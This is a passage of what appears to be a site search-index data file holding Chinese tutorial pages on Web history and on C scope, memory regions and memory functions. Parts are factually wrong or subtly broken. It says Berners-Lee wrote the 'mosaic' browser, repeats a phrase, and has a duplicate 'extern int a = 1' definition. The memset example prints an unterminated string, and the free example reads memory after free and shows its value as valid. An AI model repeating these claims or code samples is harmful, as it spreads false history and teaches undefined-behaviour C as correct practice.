1994年10月，蒂姆·伯纳斯·李(Tim Berners-Lee) 成立万维网联盟，又称W3C理事会(W3C 致力于对web 进行标准化)。\n\n\n# 万维网\n\n蒂姆·伯纳斯·李发明了他发明了World Wide Web(WWW)。\n\n在1990年圣诞假期，伯纳斯·李制作了要一个网络工作所必须的所有工具：第一个万维网浏览器（同时也是编辑器）和第一个网页服务器。\n\nWWW可以让Web客户端（常用浏览器）访问浏览Web服务器上的页面。 是一个由许多互相链接的超文本组成的系统，通过互联网访问。\n\n\n> 他并没有为“WWW”申请专利或限制它的使用，而是无偿的向全世界开放。如果给万维网申请专利，他将成为物质上最富有的人。\n\n\n# W3C\n\n万维网（World Wide Web）是作为欧洲核子研究组织的一个项目发展起来的，在那里 Tim Berners-Lee 开发出万维网的雏形。Tim Berners-Lee- 万维网的发明人和万维网联盟的主任。\n\n万维网联盟，又称W3C理事会。1994年10月在麻省理工学院计算机科学实验室成立。建立者是万维网的发明者蒂姆·伯纳斯·李。\n\nW3C 最重要的工作是发展 Web 规范（称为推荐，Recommendations），这些规范描述了 Web 的通信协议（比如 HTML 和 XHTML、CSS等）和其他的构建模块。\n\n\n# 网页从学术机构走向公众社会\n\n万维网（WWW）是欧洲核子研究组织的科学家为了方便看文档、传递论文而创造的，这就是为什么Web网页都基于Document。Document就是用标记语言+超链接写成的由文字和图片构成的HTML页面，这样的功能已经完全满足学术交流的需要，所以网页的早期形态和Document一样，完全基于HTML页面，并且所有内容都是静态的。\n\n随着网页从学术机构走向公众社会，网页承载的功能便超出了学术范围而变得愈加丰富。\n\n\n# Web社会影响\n\n万维网使得全世界的人们以史无前例的巨大规模相互交流。相距遥远的人们，甚至是不同年代的人们可以通过网络来发展亲密的关系或者使彼此思想境界得到升华，甚至改变他们对待小事的态度以及精神。情感经历、政治观点、文化习惯、表达方式、商业建议、艺术、摄影、文学都可以以人类历史上从来没有过的低投入实现数据共享。\n\n万维网是人类历史上最深远、最广泛的传播媒介。它可以使它的用户可以和分散于这个行星上不同时空的其他人群相互联系，其人数远远超过通过具体接触或其他所有已经存在的通讯媒介的总和所能达到的数目。\n\n\n# Web行业的发展趋势\n\n\n# Web行业的发展动力\n\n历史演变\n\n前后端不分 -> 前后端分离 -> 全栈工程师\n\n演变动力\n\n更加产业化、大规模地生产软件\n\n效率更高\n\n成本更低\n\n通用性好、能够快速产出的技术最终会赢，单个程序员的生产力要求越来越高，程序员只有向全栈进化才能满足越来越高的工作要求。\n\n\n# H5 就是一个最好的例子\n\n为什么 H5 技术会赢得移动端？开发速度快：原生app 需要重新编译才能看到结果，H5 是即时输出。开发成本低：原生app 需要两个开发团队，H5 只要一个团队\n\n快速发布：安卓 Native 新版本需要24小时，iOS 需要 3 ～ 4 天，H5 可以随时更新\n\n\n# 未来软件的特点\n\n * 联网\n * 高并发\n * 分布式\n * 跨终端\n\n现在基于 Web 的前端技术，将演变为未来所有软件的通用的 GUI 解决方案。\n\n\n# 未来只有两种软件工程师\n\n * 端工程师\n   * 手机端\n   * PC 端\n   * TV 端\n   * VR 端\n   * ……\n * 云工程师",normalizedContent:"# web发展史\n\n> 读史以明鉴,知古以鉴今!\n\n时至今日，web发展从有到无，从简到繁，随着时间的推移，web发展也越来越快，对于人类的影响也越来越大！\n\n\n# 世界性的信息库\n\n20世纪40年代以来，人们就梦想能拥有一个世界性的信息库。在这个信息库中，信息不仅能被全球的人们存取，而且能轻松地链接到其他地方的信息，使用户可以方便快捷地获得重要的信息。\n\ngopher是internet上一个非常有名的信息查找系统，它将internet上的文件组织成某种索引，很方便地将用户从internet的一处带到另一处。在www出现之前，gopher是internet上最主要的信息检索工具，gopher站点也是最主要的站点，但在www出现后，gopher失去了昔日的辉煌。\n\n\n# web诞生\n\n> 1990年可以看做web开发历史的起点。\n\n * 1990年，万维网之父蒂姆·伯纳斯·李（tim berners-lee）开发出了第一个网页浏览器mosaic，随即很多出色的程序员加入了网页浏览器开发的行列；\n * 1991年8月6日，由蒂姆·伯纳斯·李建立的全世界第一个万维网网站上线。\n * 1993年4月30日，欧洲核子研究组织宣布万维网对任何人免费开放，并不收取任何费用。两个月之后gopher宣布不再免费，造成大量用户从gopher转向万维网。\n * 1994年10月13日，网景公司开发的浏览器mosaic netscape 0.9发布；\n * 1994年10月，蒂姆·伯纳斯·李(tim berners-lee) 成立万维网联盟，又称w3c理事会(w3c 致力于对web 进行标准化)。\n\n\n# 万维网\n\n蒂姆·伯纳斯·李发明了他发明了world wide web(www)。\n\n在1990年圣诞假期，伯纳斯·李制作了要一个网络工作所必须的所有工具：第一个万维网浏览器（同时也是编辑器）和第一个网页服务器。\n\nwww可以让web客户端（常用浏览器）访问浏览web服务器上的页面。 是一个由许多互相链接的超文本组成的系统，通过互联网访问。\n\n\n> 他并没有为“www”申请专利或限制它的使用，而是无偿的向全世界开放。如果给万维网申请专利，他将成为物质上最富有的人。\n\n\n# w3c\n\n万维网（world wide web）是作为欧洲核子研究组织的一个项目发展起来的，在那里 tim berners-lee 开发出万维网的雏形。tim berners-lee- 万维网的发明人和万维网联盟的主任。\n\n万维网联盟，又称w3c理事会。1994年10月在麻省理工学院计算机科学实验室成立。建立者是万维网的发明者蒂姆·伯纳斯·李。\n\nw3c 最重要的工作是发展 web 规范（称为推荐，recommendations），这些规范描述了 web 的通信协议（比如 html 和 xhtml、css等）和其他的构建模块。\n\n\n# 网页从学术机构走向公众社会\n\n万维网（www）是欧洲核子研究组织的科学家为了方便看文档、传递论文而创造的，这就是为什么web网页都基于document。document就是用标记语言+超链接写成的由文字和图片构成的html页面，这样的功能已经完全满足学术交流的需要，所以网页的早期形态和document一样，完全基于html页面，并且所有内容都是静态的。\n\n随着网页从学术机构走向公众社会，网页承载的功能便超出了学术范围而变得愈加丰富。\n\n\n# web社会影响\n\n万维网使得全世界的人们以史无前例的巨大规模相互交流。相距遥远的人们，甚至是不同年代的人们可以通过网络来发展亲密的关系或者使彼此思想境界得到升华，甚至改变他们对待小事的态度以及精神。情感经历、政治观点、文化习惯、表达方式、商业建议、艺术、摄影、文学都可以以人类历史上从来没有过的低投入实现数据共享。\n\n万维网是人类历史上最深远、最广泛的传播媒介。它可以使它的用户可以和分散于这个行星上不同时空的其他人群相互联系，其人数远远超过通过具体接触或其他所有已经存在的通讯媒介的总和所能达到的数目。\n\n\n# web行业的发展趋势\n\n\n# web行业的发展动力\n\n历史演变\n\n前后端不分 -> 前后端分离 -> 全栈工程师\n\n演变动力\n\n更加产业化、大规模地生产软件\n\n效率更高\n\n成本更低\n\n通用性好、能够快速产出的技术最终会赢，单个程序员的生产力要求越来越高，程序员只有向全栈进化才能满足越来越高的工作要求。\n\n\n# h5 就是一个最好的例子\n\n为什么 h5 技术会赢得移动端？开发速度快：原生app 需要重新编译才能看到结果，h5 是即时输出。开发成本低：原生app 需要两个开发团队，h5 只要一个团队\n\n快速发布：安卓 native 新版本需要24小时，ios 需要 3 ～ 4 天，h5 可以随时更新\n\n\n# 未来软件的特点\n\n * 联网\n * 高并发\n * 分布式\n * 跨终端\n\n现在基于 web 的前端技术，将演变为未来所有软件的通用的 gui 解决方案。\n\n\n# 未来只有两种软件工程师\n\n * 端工程师\n   * 手机端\n   * pc 端\n   * tv 端\n   * vr 端\n   * ……\n * 云工程师",charsets:{cjk:!0}},{title:"作用域",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/06-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.html",relativePath:"数据结构/C语言程序设计/06-内存管理.md",key:"v-18d67b3c",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/06-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.html",headers:[{level:2,title:"作用域",slug:"作用域",normalizedTitle:"作用域",charIndex:2},{level:3,title:"局部作用域",slug:"局部作用域",normalizedTitle:"局部作用域",charIndex:89},{level:3,title:"静态局部变量",slug:"静态局部变量",normalizedTitle:"静态局部变量",charIndex:507},{level:3,title:"全局作用域",slug:"全局作用域",normalizedTitle:"全局作用域",charIndex:830},{level:3,title:"静态全局变量",slug:"静态全局变量",normalizedTitle:"静态全局变量",charIndex:1159},{level:3,title:"extern 全局变量声明",slug:"extern-全局变量声明",normalizedTitle:"extern 全局变量声明",charIndex:1523},{level:3,title:"全局函数和静态函数",slug:"全局函数和静态函数",normalizedTitle:"全局函数和静态函数",charIndex:1791},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:2381},{level:2,title:"内存管理",slug:"内存管理",normalizedTitle:"内存管理",charIndex:2755},{level:3,title:"内存分区",slug:"内存分区",normalizedTitle:"内存分区",charIndex:2764},{level:3,title:"内存操作函数",slug:"内存操作函数",normalizedTitle:"内存操作函数",charIndex:3202}],headersStr:"作用域 局部作用域 静态局部变量 全局作用域 静态全局变量 extern 全局变量声明 全局函数和静态函数 总结 内存管理 内存分区 内存操作函数",content:'# 作用域\n\nC语言变量的作用域分为:\n\n * 代码块作用域，如for、while、if、switch等\n * 函数作用域，如main函数\n * 文件作用域，如全局变量\n\n\n# 局部作用域\n\n> 局部变量的作用域是从声明开始到所在代码块结束, 也叫 auto 变量, 一般情况下代码块 {} 内部定义的变量都是局部变量\n\n * 在一个函数内部定义的变量，只能在函数内部使用\n * 在复合语句中定义的变量，只能在复合语句中使用\n * 随着函数调用的结束或复合语句的结束，变量的生命周期也结束了\n * 如果没有初始化，局部变量的值是随机的\n\n#include <stdio.h>\n\nint main(void)\n{\n    int a = 1;\n    {\n        int b = 2;\n        printf("a = %d, b = %d\\n", a, b);\n    }\n    printf("a = %d, b = %d\\n", a, b); // error: \'b\' undeclared (first use in this function)\n    return 0;\n}\n\n\n\n# 静态局部变量\n\n * static局部变量的作用域也是定义的函数内有效\n * static局部变量的生命周期是整个程序运行期间，只初始化一次，但是可以被多次赋值\n * static局部变量的值如果没有初始化，则由系统自动赋值：数值型变量为0，字符型变量为\'\\0\'，指针型变量为NULL\n\n#include <stdio.h>\n\nint main(void)\n{\n    int i;\n    for (i = 0; i < 3; i++)\n    {\n        static int a = 1;\n        a++;\n        printf("a = %d\\n", a);\n    }\n    return 0;\n}\n\n\n\n# 全局作用域\n\n * 在函数外部定义的变量，可被本文件中的所有函数使用，也叫 extern 变量。\n * 全局变量的生命周期和程序的运行周期一样，从程序开始运行到程序结束\n * 不同文件中的全局变量不可以重名。\n\n// main1.c\n\n#include <stdio.h>\n\nint a = 1; // 全局变量\n\nvoid func(void)\n{\n    printf("a = %d\\n", a);\n}\n\n// main.c\n#include <stdio.h>\n\nextern  int a = 1; // 全局变量\n\nint main(void)\n{\n    printf("a = %d\\n", a);\n    return 0;\n}\n\n\n\n# 静态全局变量\n\n * 在函数外定义，作用范围被限制在所定义的文件内\n * 不同文件中的静态全局变量可以重名，但是不能在同一个文件中重名\n * static全局变量的生命周期和程序的运行周期一样，同时static全局变量的值只初始化一次，但是可以被多次赋值\n\n\n// main1.c\n\n#include <stdio.h>\n\nstatic int a = 1; // 静态全局变量\n\nvoid func(void)\n{\n    printf("a = %d\\n", a);\n}\n\n// main.c\n\n#include <stdio.h>\n\nstatic int a = 1; // 静态全局变量\n\nint main(void)\n{\n    printf("a = %d\\n", a);\n    return 0;\n}\n\n\n\n# extern 全局变量声明\n\n * extern全局变量的作用域是从声明开始到文件结束。\n\n\n// main1.c\n\n#include <stdio.h>\n\nint a = 1; // 全局变量\n\nvoid func(void)\n{\n    printf("a = %d\\n", a);\n}\n\n// main.c\n\n#include <stdio.h>\n\nextern int a; // 全局变量声明\n\nint main(void)\n{\n    printf("a = %d\\n", a);\n    return 0;\n}\n\n\n\n# 全局函数和静态函数\n\n> 在C语言中函数默认是全局的，使用关键字 static 可以将函数定义为静态函数，静态函数只能在本文件中使用，不能被其他文件调用。\n\nTIP\n\n * 允许在不同的函数中使用相同的函数名，它们代表不同的函数。\n * 同一源文件中，允许全局变量和局部变量同名，但是局部变量优先级高于全局变量。\n * 所有的函数默认都是全局函数，可以被其他文件调用。所以所有的函数不能重名。如果是静态函数，只能在本文件中使用，可以和其他文件中的函数重名。\n\n\n// main1.c\n\n#include <stdio.h>\n\nstatic void func(void)\n{\n    printf("func\\n");\n}\n\nvoid func1(void)\n{\n    printf("func1\\n");\n}\n\n// main.c\n\n#include <stdio.h>\n\nextern void func(void); // 函数声明\nextern void func1(void); // 函数声明\nint main(void)\n{\n    func();  //报错，因为func是静态函数，只能在main1.c中使用\n    func1(); //正确，因为func1是全局函数，可以在main.c中使用,输出`func1`\n    return 0;\n}\n\n\n\n# 总结\n\n类型            作用域      生命周期       初始化\nauto 变量       一对大括号内   一对大括号内     随机值\nstatic 变量     一对大括号内   整个程序运行期间   0\nextern 变量     整个文件     整个程序运行期间   0\nstatic 全局变量   整个文件     整个程序运行期间   0\nextern 全局变量   整个文件     整个程序运行期间   0\nstatic 函数     整个文件     整个程序运行期间   0\nextern 函数     整个文件     整个程序运行期间   0\nregister 变量   一对大括号内   一对大括号内     随机值\n全局变量          整个文件     整个程序运行期间   0\n\n\n# 内存管理\n\n\n# 内存分区\n\n> C语言程序在执行时，将内存大方向划分为4个区域\n\n * 代码区：存放函数体的二进制代码，由操作系统进行管理的\n\n> 存放CPU执行的机器指令，代码区是共享的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可\n\n * 全局区：存放全局变量和静态变量以及常量\n\n> 该区包含了在程序中所有的全局变量、静态变量、常量和字符串常量，程序结束后由系统释放\n\n * 栈区：由编译器自动分配释放，存放函数的参数值，局部变量等\n\n> 存入的是全局变量的地址，函数的参数值，局部变量等，由编译器自动分配释放，存放函数的参数值，局部变量等\n\n * 堆区：由程序员分配和释放，若程序员不释放，程序结束时由操作系统回收\n\n> 堆区是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。\n\n\n# 内存操作函数\n\n# 内存操作函数\n\n函数        功能      参数                  返回值                              头文件\nmemset    内存初始化   目标地址、初始化值、初始化字节数    目标地址                             string.h\nmemcpy    内存拷贝    目标地址、源地址、拷贝字节数      目标地址                             string.h\nmemmove   内存拷贝    目标地址、源地址、拷贝字节数      目标地址                             string.h\nmemcmp    内存比较    内存1地址、内存2地址、比较字节数   相等返回0，内存1大于内存2返回1，内存1小于内存2返回-1   string.h\nmemchr    内存查找    目标地址、查找字符、查找字节数     查找到返回目标地址，查找不到返回NULL             string.h\n\nmemset\n\n#include <stdio.h>\n#include <string.h>\n\nvoid *memset(void *s, int c, size_t n);\n// 功能：将s的内存区域的前n个字节以参数c填入，返回s\n// 参数：s：目标地址\n//      c：初始化值\n//      n：初始化字节数\n// 返回值：目标地址\n\nint main(void)\n{\n    char str[10] = {0};\n    memset(str, \'a\', sizeof(str));\n    printf("str = %s\\n", str); // str = aaaaaaaa\n    return 0;\n}\n\n\nmemcpy\n\n#include <stdio.h>\n#include <string.h>\n\nvoid *memcpy(void *dest, const void *src, size_t n);\n// 功能：将src的前n个字节拷贝到dest，返回dest\n// 参数：dest：目标地址\n//      src：源地址\n//      n：拷贝字节数\n// 返回值：目标地址\n\nint main(void)\n{\n    char str[10] = {0};\n    char str1[] = "hello";\n    memcpy(str, str1, sizeof(str1));\n    printf("str = %s\\n", str); // str = hello\n    return 0;\n}\n\n\nmemmove\n\n#include <stdio.h>\n#include <string.h>\n\nvoid *memmove(void *dest, const void *src, size_t n);\n\n// 功能：将src的前n个字节拷贝到dest，返回dest\n// 参数：dest：目标地址\n//      src：源地址\n//      n：拷贝字节数\n// 返回值：目标地址\n\nint main(void)\n{\n    char str[10] = {0};\n    char str1[] = "hello";\n    memmove(str, str1, sizeof(str1));\n    printf("str = %s\\n", str); // str = hello\n    return 0;\n}\n\n\nmemcmp\n\n#include <stdio.h>\n#include <string.h>\n\nint memcmp(const void *s1, const void *s2, size_t n);\n\n// 功能：比较s1和s2的前n个字节，返回相等返回0，s1大于s2返回1，s1小于s2返回-1\n// 参数：s1：内存1地址\n//      s2：内存2地址\n//      n：比较字节数\n// 返回值：相等返回0，s1大于s2返回1，s1小于s2返回-1\n\nint main(void)\n{\n    char str[10] = "hello";\n    char str1[] = "hello";\n    int ret = memcmp(str, str1, sizeof(str1));\n    printf("ret = %d\\n", ret); // ret = 0\n    return 0;\n}\n\n\n# 堆内存分配和释放\n\n函数        功能       参数           返回值                    头文件\nmalloc    分配内存     内存大小         分配成功返回内存首地址，失败返回NULL   stdlib.h\ncalloc    分配内存     内存大小、元素个数    分配成功返回内存首地址，失败返回NULL   stdlib.h\nrealloc   重新分配内存   内存首地址、内存大小   分配成功返回内存首地址，失败返回NULL   stdlib.h\nfree      释放内存     内存首地址        无                      stdlib.h\n\nmalloc\n\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid *malloc(size_t size);\n\n// 功能：分配size字节的内存，返回分配的内存首地址\n// 参数：size：内存大小\n// 返回值：分配成功返回内存首地址，失败返回NULL\n\nint main(void)\n{\n    int *p = NULL;\n    p = (int *)malloc(sizeof(int));\n    if (p == NULL)\n    {\n        printf("malloc error\\n");\n        return -1;\n    }\n    *p = 10;\n    printf("*p = %d\\n", *p); // *p = 10\n    free(p);\n    return 0;\n}\n\n\ncalloc\n\n\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid *calloc(size_t nitems, size_t size);\n\n// 功能：分配nitems个size字节的内存，返回分配的内存首地址\n// 参数：nitems：元素个数\n//      size：内存大小\n// 返回值：分配成功返回内存首地址，失败返回NULL\n\nint main(void)\n{\n    int *p = NULL;\n    p = (int *)calloc(1, sizeof(int));\n    if (p == NULL)\n    {\n        printf("calloc error\\n");\n        return -1;\n    }\n    *p = 10;\n    printf("*p = %d\\n", *p); // *p = 10\n    free(p);\n    return 0;\n}\n\n\nrealloc\n\n\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid *realloc(void *ptr, size_t size);\n\n// 功能：重新分配内存，返回分配的内存首地址\n// 参数：ptr：内存首地址\n//      size：内存大小\n// 返回值：分配成功返回内存首地址，失败返回NULL\n\nint main(void)\n{\n    int *p = NULL;\n    p = (int *)malloc(sizeof(int));\n    if (p == NULL)\n    {\n        printf("malloc error\\n");\n        return -1;\n    }\n    *p = 10;\n    printf("*p = %d\\n", *p); // *p = 10\n    p = realloc(p, sizeof(int) * 2);\n    if (p == NULL)\n    {\n        printf("realloc error\\n");\n        return -1;\n    }\n    printf("*p = %d\\n", *p); // *p = 10\n    free(p);\n    return 0;\n}\n\n\nfree\n\n\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid free(void *ptr);\n\n// 功能：释放内存\n// 参数：ptr：内存首地址\n// 返回值：无\n\nint main(void)\n{\n    int *p = NULL;\n    p = (int *)malloc(sizeof(int));\n    if (p == NULL)\n    {\n        printf("malloc error\\n");\n        return -1;\n    }\n    *p = 10;\n    printf("*p = %d\\n", *p); // *p = 10\n    free(p);\n    printf("*p = %d\\n", *p); // *p = 10\n    return 0;\n}\n',normalizedContent:'# 作用域\n\nc语言变量的作用域分为:\n\n * 代码块作用域，如for、while、if、switch等\n * 函数作用域，如main函数\n * 文件作用域，如全局变量\n\n\n# 局部作用域\n\n> 局部变量的作用域是从声明开始到所在代码块结束, 也叫 auto 变量, 一般情况下代码块 {} 内部定义的变量都是局部变量\n\n * 在一个函数内部定义的变量，只能在函数内部使用\n * 在复合语句中定义的变量，只能在复合语句中使用\n * 随着函数调用的结束或复合语句的结束，变量的生命周期也结束了\n * 如果没有初始化，局部变量的值是随机的\n\n#include <stdio.h>\n\nint main(void)\n{\n    int a = 1;\n    {\n        int b = 2;\n        printf("a = %d, b = %d\\n", a, b);\n    }\n    printf("a = %d, b = %d\\n", a, b); // error: \'b\' undeclared (first use in this function)\n    return 0;\n}\n\n\n\n# 静态局部变量\n\n * static局部变量的作用域也是定义的函数内有效\n * static局部变量的生命周期是整个程序运行期间，只初始化一次，但是可以被多次赋值\n * static局部变量的值如果没有初始化，则由系统自动赋值：数值型变量为0，字符型变量为\'\\0\'，指针型变量为null\n\n#include <stdio.h>\n\nint main(void)\n{\n    int i;\n    for (i = 0; i < 3; i++)\n    {\n        static int a = 1;\n        a++;\n        printf("a = %d\\n", a);\n    }\n    return 0;\n}\n\n\n\n# 全局作用域\n\n * 在函数外部定义的变量，可被本文件中的所有函数使用，也叫 extern 变量。\n * 全局变量的生命周期和程序的运行周期一样，从程序开始运行到程序结束\n * 不同文件中的全局变量不可以重名。\n\n// main1.c\n\n#include <stdio.h>\n\nint a = 1; // 全局变量\n\nvoid func(void)\n{\n    printf("a = %d\\n", a);\n}\n\n// main.c\n#include <stdio.h>\n\nextern  int a = 1; // 全局变量\n\nint main(void)\n{\n    printf("a = %d\\n", a);\n    return 0;\n}\n\n\n\n# 静态全局变量\n\n * 在函数外定义，作用范围被限制在所定义的文件内\n * 不同文件中的静态全局变量可以重名，但是不能在同一个文件中重名\n * static全局变量的生命周期和程序的运行周期一样，同时static全局变量的值只初始化一次，但是可以被多次赋值\n\n\n// main1.c\n\n#include <stdio.h>\n\nstatic int a = 1; // 静态全局变量\n\nvoid func(void)\n{\n    printf("a = %d\\n", a);\n}\n\n// main.c\n\n#include <stdio.h>\n\nstatic int a = 1; // 静态全局变量\n\nint main(void)\n{\n    printf("a = %d\\n", a);\n    return 0;\n}\n\n\n\n# extern 全局变量声明\n\n * extern全局变量的作用域是从声明开始到文件结束。\n\n\n// main1.c\n\n#include <stdio.h>\n\nint a = 1; // 全局变量\n\nvoid func(void)\n{\n    printf("a = %d\\n", a);\n}\n\n// main.c\n\n#include <stdio.h>\n\nextern int a; // 全局变量声明\n\nint main(void)\n{\n    printf("a = %d\\n", a);\n    return 0;\n}\n\n\n\n# 全局函数和静态函数\n\n> 在c语言中函数默认是全局的，使用关键字 static 可以将函数定义为静态函数，静态函数只能在本文件中使用，不能被其他文件调用。\n\ntip\n\n * 允许在不同的函数中使用相同的函数名，它们代表不同的函数。\n * 同一源文件中，允许全局变量和局部变量同名，但是局部变量优先级高于全局变量。\n * 所有的函数默认都是全局函数，可以被其他文件调用。所以所有的函数不能重名。如果是静态函数，只能在本文件中使用，可以和其他文件中的函数重名。\n\n\n// main1.c\n\n#include <stdio.h>\n\nstatic void func(void)\n{\n    printf("func\\n");\n}\n\nvoid func1(void)\n{\n    printf("func1\\n");\n}\n\n// main.c\n\n#include <stdio.h>\n\nextern void func(void); // 函数声明\nextern void func1(void); // 函数声明\nint main(void)\n{\n    func();  //报错，因为func是静态函数，只能在main1.c中使用\n    func1(); //正确，因为func1是全局函数，可以在main.c中使用,输出`func1`\n    return 0;\n}\n\n\n\n# 总结\n\n类型            作用域      生命周期       初始化\nauto 变量       一对大括号内   一对大括号内     随机值\nstatic 变量     一对大括号内   整个程序运行期间   0\nextern 变量     整个文件     整个程序运行期间   0\nstatic 全局变量   整个文件     整个程序运行期间   0\nextern 全局变量   整个文件     整个程序运行期间   0\nstatic 函数     整个文件     整个程序运行期间   0\nextern 函数     整个文件     整个程序运行期间   0\nregister 变量   一对大括号内   一对大括号内     随机值\n全局变量          整个文件     整个程序运行期间   0\n\n\n# 内存管理\n\n\n# 内存分区\n\n> c语言程序在执行时，将内存大方向划分为4个区域\n\n * 代码区：存放函数体的二进制代码，由操作系统进行管理的\n\n> 存放cpu执行的机器指令，代码区是共享的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可\n\n * 全局区：存放全局变量和静态变量以及常量\n\n> 该区包含了在程序中所有的全局变量、静态变量、常量和字符串常量，程序结束后由系统释放\n\n * 栈区：由编译器自动分配释放，存放函数的参数值，局部变量等\n\n> 存入的是全局变量的地址，函数的参数值，局部变量等，由编译器自动分配释放，存放函数的参数值，局部变量等\n\n * 堆区：由程序员分配和释放，若程序员不释放，程序结束时由操作系统回收\n\n> 堆区是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。\n\n\n# 内存操作函数\n\n# 内存操作函数\n\n函数        功能      参数                  返回值                              头文件\nmemset    内存初始化   目标地址、初始化值、初始化字节数    目标地址                             string.h\nmemcpy    内存拷贝    目标地址、源地址、拷贝字节数      目标地址                             string.h\nmemmove   内存拷贝    目标地址、源地址、拷贝字节数      目标地址                             string.h\nmemcmp    内存比较    内存1地址、内存2地址、比较字节数   相等返回0，内存1大于内存2返回1，内存1小于内存2返回-1   string.h\nmemchr    内存查找    目标地址、查找字符、查找字节数     查找到返回目标地址，查找不到返回null             string.h\n\nmemset\n\n#include <stdio.h>\n#include <string.h>\n\nvoid *memset(void *s, int c, size_t n);\n// 功能：将s的内存区域的前n个字节以参数c填入，返回s\n// 参数：s：目标地址\n//      c：初始化值\n//      n：初始化字节数\n// 返回值：目标地址\n\nint main(void)\n{\n    char str[10] = {0};\n    memset(str, \'a\', sizeof(str));\n    printf("str = %s\\n", str); // str = aaaaaaaa\n    return 0;\n}\n\n\nmemcpy\n\n#include <stdio.h>\n#include <string.h>\n\nvoid *memcpy(void *dest, const void *src, size_t n);\n// 功能：将src的前n个字节拷贝到dest，返回dest\n// 参数：dest：目标地址\n//      src：源地址\n//      n：拷贝字节数\n// 返回值：目标地址\n\nint main(void)\n{\n    char str[10] = {0};\n    char str1[] = "hello";\n    memcpy(str, str1, sizeof(str1));\n    printf("str = %s\\n", str); // str = hello\n    return 0;\n}\n\n\nmemmove\n\n#include <stdio.h>\n#include <string.h>\n\nvoid *memmove(void *dest, const void *src, size_t n);\n\n// 功能：将src的前n个字节拷贝到dest，返回dest\n// 参数：dest：目标地址\n//      src：源地址\n//      n：拷贝字节数\n// 返回值：目标地址\n\nint main(void)\n{\n    char str[10] = {0};\n    char str1[] = "hello";\n    memmove(str, str1, sizeof(str1));\n    printf("str = %s\\n", str); // str = hello\n    return 0;\n}\n\n\nmemcmp\n\n#include <stdio.h>\n#include <string.h>\n\nint memcmp(const void *s1, const void *s2, size_t n);\n\n// 功能：比较s1和s2的前n个字节，返回相等返回0，s1大于s2返回1，s1小于s2返回-1\n// 参数：s1：内存1地址\n//      s2：内存2地址\n//      n：比较字节数\n// 返回值：相等返回0，s1大于s2返回1，s1小于s2返回-1\n\nint main(void)\n{\n    char str[10] = "hello";\n    char str1[] = "hello";\n    int ret = memcmp(str, str1, sizeof(str1));\n    printf("ret = %d\\n", ret); // ret = 0\n    return 0;\n}\n\n\n# 堆内存分配和释放\n\n函数        功能       参数           返回值                    头文件\nmalloc    分配内存     内存大小         分配成功返回内存首地址，失败返回null   stdlib.h\ncalloc    分配内存     内存大小、元素个数    分配成功返回内存首地址，失败返回null   stdlib.h\nrealloc   重新分配内存   内存首地址、内存大小   分配成功返回内存首地址，失败返回null   stdlib.h\nfree      释放内存     内存首地址        无                      stdlib.h\n\nmalloc\n\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid *malloc(size_t size);\n\n// 功能：分配size字节的内存，返回分配的内存首地址\n// 参数：size：内存大小\n// 返回值：分配成功返回内存首地址，失败返回null\n\nint main(void)\n{\n    int *p = null;\n    p = (int *)malloc(sizeof(int));\n    if (p == null)\n    {\n        printf("malloc error\\n");\n        return -1;\n    }\n    *p = 10;\n    printf("*p = %d\\n", *p); // *p = 10\n    free(p);\n    return 0;\n}\n\n\ncalloc\n\n\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid *calloc(size_t nitems, size_t size);\n\n// 功能：分配nitems个size字节的内存，返回分配的内存首地址\n// 参数：nitems：元素个数\n//      size：内存大小\n// 返回值：分配成功返回内存首地址，失败返回null\n\nint main(void)\n{\n    int *p = null;\n    p = (int *)calloc(1, sizeof(int));\n    if (p == null)\n    {\n        printf("calloc error\\n");\n        return -1;\n    }\n    *p = 10;\n    printf("*p = %d\\n", *p); // *p = 10\n    free(p);\n    return 0;\n}\n\n\nrealloc\n\n\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid *realloc(void *ptr, size_t size);\n\n// 功能：重新分配内存，返回分配的内存首地址\n// 参数：ptr：内存首地址\n//      size：内存大小\n// 返回值：分配成功返回内存首地址，失败返回null\n\nint main(void)\n{\n    int *p = null;\n    p = (int *)malloc(sizeof(int));\n    if (p == null)\n    {\n        printf("malloc error\\n");\n        return -1;\n    }\n    *p = 10;\n    printf("*p = %d\\n", *p); // *p = 10\n    p = realloc(p, sizeof(int) * 2);\n    if (p == null)\n    {\n        printf("realloc error\\n");\n        return -1;\n    }\n    printf("*p = %d\\n", *p); // *p = 10\n    free(p);\n    return 0;\n}\n\n\nfree\n\n\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid free(void *ptr);\n\n// 功能：释放内存\n// 参数：ptr：内存首地址\n// 返回值：无\n\nint main(void)\n{\n    int *p = null;\n    p = (int *)malloc(sizeof(int));\n    if (p == null)\n    {\n        printf("malloc error\\n");\n        return -1;\n    }\n    *p = 10;\n    printf("*p = %d\\n", *p); // *p = 10\n    free(p);\n    printf("*p = %d\\n", *p); // *p = 10\n    return 